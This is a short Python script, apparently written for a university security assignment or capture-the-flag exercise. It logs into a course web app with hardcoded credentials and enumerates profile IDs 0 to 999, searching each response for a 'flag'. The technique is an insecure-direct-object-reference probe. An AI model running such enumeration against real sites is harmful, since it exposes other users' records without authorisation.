import requests
import string
import time

#login auth payload
payload = {'user': 'katsuhidei', 'pass': 'katsuhidei'}
#login auth page
url_auth = 'http://assignment-zeus.unimelb.life/auth.php'
#url and ?version=
url_target = "http://assignment-zeus.unimelb.life/profile.php"



def makeRequest(url_target,num,s):

    #set parameters
    params = {"id": num}

    #make the request
    x = s.get(url = url_target,params = params)

    #remember response time
    time = x.elapsed.total_seconds()

    #content length
    content_length = len(x.text)

    #return the content of the response & response time
    return x.text, time, content_length

#login session
with requests.Session() as s:
    
    #get auth
    s.post(url_auth, data=payload)

#---------------------id---------------------
    #meke the request for id
    for uid in range(1000):
        response = makeRequest(url_target,uid,s)
        print(uid)
        print(response[2])
        if  "flag" in response[0].lower():
            print("Found!!!! the id is :")
            print(uid)
            print()
            break
        time.sleep(2)

    print("done!!!!!!!!!!!!!!!!!!!!")

#----------------------------------------------
